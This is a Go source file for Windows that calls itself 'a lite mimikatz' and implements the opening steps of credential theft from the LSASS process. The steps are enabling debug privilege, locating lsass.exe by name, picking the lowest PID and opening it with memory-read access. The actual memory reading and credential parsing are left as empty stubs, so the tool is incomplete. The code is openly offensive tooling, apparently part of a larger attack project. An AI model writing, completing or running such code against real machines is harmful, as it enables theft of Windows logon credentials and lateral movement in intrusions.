// +build windows

package kiwi

import (
	"sort"
	"sync"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/logger"
	"project/internal/module/windows/api"
	"project/internal/module/windows/privilege"
)

// Credential contain information.
type Credential struct {
}

// Kiwi is a lite mimikatz.
type Kiwi struct {
	logger logger.Logger

	// privilege
	debug bool

	// 0 = not read, 1 = true, 2 = false
	wow64 uint8

	// PID about lsass.exe
	pid uint32

	// about Windows version
	major uint32
	minor uint32
	build uint32

	mu sync.Mutex
}

// NewKiwi is used to create a new kiwi.
func NewKiwi(logger logger.Logger) *Kiwi {
	return &Kiwi{logger: logger}
}

func (kiwi *Kiwi) log(lv logger.Level, log ...interface{}) {
	kiwi.logger.Println(lv, "kiwi", log...)
}

func (kiwi *Kiwi) logf(lv logger.Level, format string, log ...interface{}) {
	kiwi.logger.Printf(lv, "kiwi", format, log...)
}

// EnableDebugPrivilege is used to enable debug privilege.
func (kiwi *Kiwi) EnableDebugPrivilege() error {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.debug {
		return nil
	}
	err := privilege.EnableDebugPrivilege()
	if err != nil {
		return err
	}
	kiwi.debug = true
	return nil
}

// GetAllCredential is used to get all credentials from lsass.exe memory.
func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
	// check is running on WOW64
	wow64, err := kiwi.isWow64()
	if err != nil {
		return nil, err
	}
	if wow64 {
		return nil, errors.New("can't access x64 process")
	}
	// get lsass process handle
	pid, err := kiwi.getLSASSProcessID()
	if err != nil {
		return nil, err
	}
	kiwi.logf(logger.Info, "PID of lsass.exe is %d", pid)
	pHandle, err := kiwi.getLSASSHandle(pid)
	if err != nil {
		return nil, err
	}
	defer api.CloseHandle(pHandle)
	kiwi.logf(logger.Info, "Handle of lsass.exe is 0x%X", pHandle)
	return nil, nil
}

func (kiwi *Kiwi) isWow64() (bool, error) {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.wow64 != 0 {
		return kiwi.wow64 == 1, nil
	}
	var wow64 bool
	err := windows.IsWow64Process(windows.CurrentProcess(), &wow64)
	if err != nil {
		return false, errors.Wrap(err, "failed to call IsWow64Process")
	}
	if wow64 {
		kiwi.wow64 = 1
	} else {
		kiwi.wow64 = 2
	}
	return wow64, nil
}

func (kiwi *Kiwi) getLSASSProcessID() (uint32, error) {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.pid != 0 {
		return kiwi.pid, nil
	}
	pid, err := api.GetProcessIDByName("lsass.exe")
	if err != nil {
		return 0, err
	}
	l := len(pid)
	if l == 1 {
		kiwi.pid = pid[0]
		return kiwi.pid, nil
	}
	// if appear multi PID, select minimize
	ps := make([]int, l)
	for i := 0; i < l; i++ {
		ps[i] = int(pid[i])
	}
	sort.Ints(ps)
	kiwi.pid = uint32(ps[0])
	return kiwi.pid, nil
}

func (kiwi *Kiwi) getWindowsVersion() (major, minor, build uint32) {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.major == 0 {
		kiwi.major, kiwi.minor, kiwi.build = api.GetVersionNumber()
	}
	return kiwi.major, kiwi.minor, kiwi.build
}

func (kiwi *Kiwi) getLSASSHandle(pid uint32) (windows.Handle, error) {
	major, _, _ := kiwi.getWindowsVersion()
	var da uint32 = windows.PROCESS_VM_READ
	if major < 6 {
		da |= windows.PROCESS_QUERY_INFORMATION
	} else {
		da |= windows.PROCESS_QUERY_LIMITED_INFORMATION
	}
	return windows.OpenProcess(da, false, pid)
}

func (kiwi *Kiwi) loadLSASSMemory() {

}
